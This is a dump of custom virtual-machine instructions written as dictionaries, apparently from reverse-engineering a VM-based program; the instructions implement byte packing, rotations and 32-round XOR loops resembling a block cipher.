{'func_name': 'load_mem', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x0'},
{'func_name': 'shl', 'op': 1, 'opt1': 2, 'opt2': 2, 'opt3': '0x10'},
{'func_name': 'or', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x1'},
{'func_name': 'shl', 'op': 1, 'opt1': 2, 'opt2': 2, 'opt3': '0x8'},
{'func_name': 'or', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x2'},
{'func_name': 'shl', 'op': 1, 'opt1': 2, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'or', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x3'},
{'func_name': 'shl', 'op': 1, 'opt1': 2, 'opt2': 2, 'opt3': '0x18'},
{'func_name': 'or', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 3, 'opt3': '0x0'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 0, 'opt1': 1, 'opt2': 1, 'opt3': '0x2'},
{'func_name': 'shr', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x10'},
{'func_name': 'store', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x0'},
{'func_name': 'shr', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x8'},
{'func_name': 'store', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x1'},
{'func_name': 'shr', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'store', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x2'},
{'func_name': 'shr', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x18'},
{'func_name': 'store', 'op': 1, 'opt1': 2, 'opt2': 1, 'opt3': '0x3'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b00'},
{'func_name': 'and', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0xffffffff'},
{'func_name': 'and', 'op': 1, 'opt1': 1, 'opt2': 1, 'opt3': '0x1f'},
{'func_name': 'shl', 'op': 0, 'opt1': 2, 'opt2': 0, 'opt3': '0x1'},
{'func_name': 'mov', 'op': 1, 'opt1': 3, 'opt2': 32, 'opt3': '0x0'},
{'func_name': 'sub', 'op': 0, 'opt1': 1, 'opt2': 3, 'opt3': '0x1'},
{'func_name': 'shr', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x1'},
{'func_name': 'or', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'and', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0xffffffff'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b00'},
{'func_name': 'and', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0xff'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'add', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x1'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'store', 'op': 8, 'opt1': 19, 'opt2': 31, 'opt3': '-0x18'},
{'func_name': 'sub', 'op': 1, 'opt1': 29, 'opt2': 31, 'opt3': '0x20'},
{'func_name': 'sub', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x60'},
{'func_name': 'sub', 'op': 1, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'xor', 'op': 0, 'opt1': 2, 'opt2': 2, 'opt3': '0x2'},
{'func_name': 'call', 'op': 17, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x10'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x20'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0xf'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x1f'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0xe'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x1e'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0xd'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x1d'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x30'},
{'func_name': 'sub', 'op': 1, 'opt1': 1, 'opt2': 29, 'opt3': '0x20'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 19, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'call', 'op': 27, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b60'},
{'func_name': 'xor', 'op': 0, 'opt1': 19, 'opt2': 19, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 10, 'opt3': '0x0'},
{'func_name': 'call', 'op': 27, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b60'},
{'func_name': 'xor', 'op': 0, 'opt1': 19, 'opt2': 19, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 18, 'opt3': '0x0'},
{'func_name': 'call', 'op': 27, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b60'},
{'func_name': 'xor', 'op': 0, 'opt1': 19, 'opt2': 19, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 24, 'opt3': '0x0'},
{'func_name': 'call', 'op': 27, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b60'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 19, 'opt3': '0x0'},
{'func_name': 'add', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x60'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 19, 'opt2': 31, 'opt3': '-0x18'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 0, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'sub', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x10'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 1, 'opt3': '0x2'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x3'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x4'},
{'func_name': 'call', 'op': 41, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x1'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'store', 'op': 8, 'opt1': 19, 'opt2': 31, 'opt3': '-0x18'},
{'func_name': 'sub', 'op': 1, 'opt1': 29, 'opt2': 31, 'opt3': '0x20'},
{'func_name': 'sub', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x60'},
{'func_name': 'sub', 'op': 1, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'xor', 'op': 0, 'opt1': 2, 'opt2': 2, 'opt3': '0x2'},
{'func_name': 'call', 'op': 17, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x10'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x20'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0xf'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x1f'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0xe'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x1e'},
{'func_name': 'load_mem', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0xd'},
{'func_name': 'call', 'op': 36, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '-0x1d'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x30'},
{'func_name': 'sub', 'op': 1, 'opt1': 1, 'opt2': 29, 'opt3': '0x20'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 19, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 13, 'opt3': '0x0'},
{'func_name': 'call', 'op': 27, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b60'},
{'func_name': 'xor', 'op': 0, 'opt1': 19, 'opt2': 19, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x30'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 23, 'opt3': '0x0'},
{'func_name': 'call', 'op': 27, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386b60'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 19, 'opt3': '0x0'},
{'func_name': 'add', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x60'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 19, 'opt2': 31, 'opt3': '-0x18'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'store', 'op': 8, 'opt1': 1, 'opt2': 31, 'opt3': '-0x18'},
{'func_name': 'store', 'op': 8, 'opt1': 0, 'opt2': 31, 'opt3': '-0x20'},
{'func_name': 'sub', 'op': 1, 'opt1': 29, 'opt2': 31, 'opt3': '0x20'},
{'func_name': 'sub', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x100'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386ad0'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0xc'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 4, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386ad0'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 8, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386ad0'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x4'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 12, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386ad0'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 256, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 0, 'opt1': 2, 'opt2': 31, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 3, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 4, 'opt2': 1, 'opt3': '0x0'},
{'func_name': 'xor', 'op': 0, 'opt1': 3, 'opt2': 3, 'opt3': '0x4'},
{'func_name': 'store', 'op': 4, 'opt1': 3, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 3, 'opt2': 0, 'opt3': '0x4'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 4, 'opt2': 1, 'opt3': '0x4'},
{'func_name': 'xor', 'op': 0, 'opt1': 3, 'opt2': 3, 'opt3': '0x4'},
{'func_name': 'store', 'op': 4, 'opt1': 3, 'opt2': 2, 'opt3': '0x4'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 3, 'opt2': 0, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 4, 'opt2': 1, 'opt3': '0x8'},
{'func_name': 'xor', 'op': 0, 'opt1': 3, 'opt2': 3, 'opt3': '0x4'},
{'func_name': 'store', 'op': 4, 'opt1': 3, 'opt2': 2, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 3, 'opt2': 0, 'opt3': '0xc'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 4, 'opt2': 1, 'opt3': '0xc'},
{'func_name': 'xor', 'op': 0, 'opt1': 3, 'opt2': 3, 'opt3': '0x4'},
{'func_name': 'store', 'op': 4, 'opt1': 3, 'opt2': 2, 'opt3': '0xc'},
{'func_name': 'mov', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x20'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x20'},
{'func_name': 'cmp', 'op': 1, 'opt1': 0, 'opt2': 32, 'opt3': '0x0'},
{'func_name': 'jmp_with_comdition', 'op': 208, 'opt1': 6, 'opt2': 49, 'opt3': '0x5654d9386b90'},
{'func_name': 'shl', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'add', 'op': 0, 'opt1': 1, 'opt2': 31, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 272, 'opt3': '0x0'},
{'func_name': 'add', 'op': 0, 'opt1': 2, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 2, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 1, 'opt3': '0x4'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 2, 'opt2': 1, 'opt3': '0x8'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 2, 'opt2': 1, 'opt3': '0xc'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x2'},
{'func_name': 'call', 'op': 99, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 1, 'opt2': 29, 'opt3': '-0x20'},
{'func_name': 'shl', 'op': 1, 'opt1': 1, 'opt2': 1, 'opt3': '0x2'},
{'func_name': 'add', 'op': 0, 'opt1': 2, 'opt2': 31, 'opt3': '0x1'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 3, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x3'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 2, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 2, 'opt2': 29, 'opt3': '0x0'},
{'func_name': 'add', 'op': 0, 'opt1': 2, 'opt2': 2, 'opt3': '0x1'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x20'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x1'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x20'},
{'func_name': 'jmp_with_comdition', 'op': 180, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x100'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'store', 'op': 8, 'opt1': 2, 'opt2': 31, 'opt3': '-0x20'},
{'func_name': 'store', 'op': 8, 'opt1': 1, 'opt2': 31, 'opt3': '-0x28'},
{'func_name': 'store', 'op': 8, 'opt1': 0, 'opt2': 31, 'opt3': '-0x30'},
{'func_name': 'sub', 'op': 1, 'opt1': 29, 'opt2': 31, 'opt3': '0x30'},
{'func_name': 'sub', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x100'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 31, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 31, 'opt3': '0x4'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 4, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 31, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 8, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 31, 'opt3': '0xc'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 12, 'opt3': '0x0'},
{'func_name': 'call', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386988'},
{'func_name': 'mov', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 4, 'opt2': 29, 'opt3': '-0x10'},
{'func_name': 'cmp', 'op': 1, 'opt1': 4, 'opt2': 32, 'opt3': '0x0'},
{'func_name': 'jmp_with_comdition', 'op': 262, 'opt1': 6, 'opt2': 49, 'opt3': '0x5654d9386b90'},
{'func_name': 'shl', 'op': 1, 'opt1': 4, 'opt2': 4, 'opt3': '0x2'},
{'func_name': 'add', 'op': 0, 'opt1': 3, 'opt2': 31, 'opt3': '0x4'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 0, 'opt2': 29, 'opt3': '0x0'},
{'func_name': 'add', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x4'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 4, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 3, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 1, 'opt2': 3, 'opt3': '0x4'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 2, 'opt2': 3, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 3, 'opt2': 3, 'opt3': '0xc'},
{'func_name': 'call', 'op': 87, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386988'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 3735879680, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 48879, 'opt3': '0x0'},
{'func_name': 'xor', 'op': 0, 'opt1': 1, 'opt2': 1, 'opt3': '0x2'},
{'func_name': 'xor', 'op': 0, 'opt1': 0, 'opt2': 0, 'opt3': '0x1'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 4, 'opt2': 29, 'opt3': '-0x10'},
{'func_name': 'shl', 'op': 1, 'opt1': 4, 'opt2': 4, 'opt3': '0x2'},
{'func_name': 'add', 'op': 0, 'opt1': 4, 'opt2': 31, 'opt3': '0x4'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 4, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x10'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x1'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '-0x10'},
{'func_name': 'jmp_with_comdition', 'op': 237, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 31, 'opt3': '0x8c'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'call', 'op': 17, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 31, 'opt3': '0x88'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 4, 'opt3': '0x0'},
{'func_name': 'call', 'op': 17, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 31, 'opt3': '0x84'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 8, 'opt3': '0x0'},
{'func_name': 'call', 'op': 17, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 31, 'opt3': '0x80'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 12, 'opt3': '0x0'},
{'func_name': 'call', 'op': 17, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x100'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'store', 'op': 4, 'opt1': 2, 'opt2': 31, 'opt3': '-0x20'},
{'func_name': 'store', 'op': 8, 'opt1': 1, 'opt2': 31, 'opt3': '-0x28'},
{'func_name': 'store', 'op': 8, 'opt1': 0, 'opt2': 31, 'opt3': '-0x30'},
{'func_name': 'sub', 'op': 1, 'opt1': 29, 'opt2': 31, 'opt3': '0x30'},
{'func_name': 'sub', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x100'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 4, 'opt3': '0x0'},
{'func_name': 'store', 'op': 8, 'opt1': 1, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 4, 'opt3': '0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 1, 'opt2': 0, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 0, 'opt1': 0, 'opt2': 31, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 0, 'opt1': 1, 'opt2': 3, 'opt3': '0x0'},
{'func_name': 'call', 'op': 137, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'cmp', 'op': 1, 'opt1': 1, 'opt2': 0, 'opt3': '0x0'},
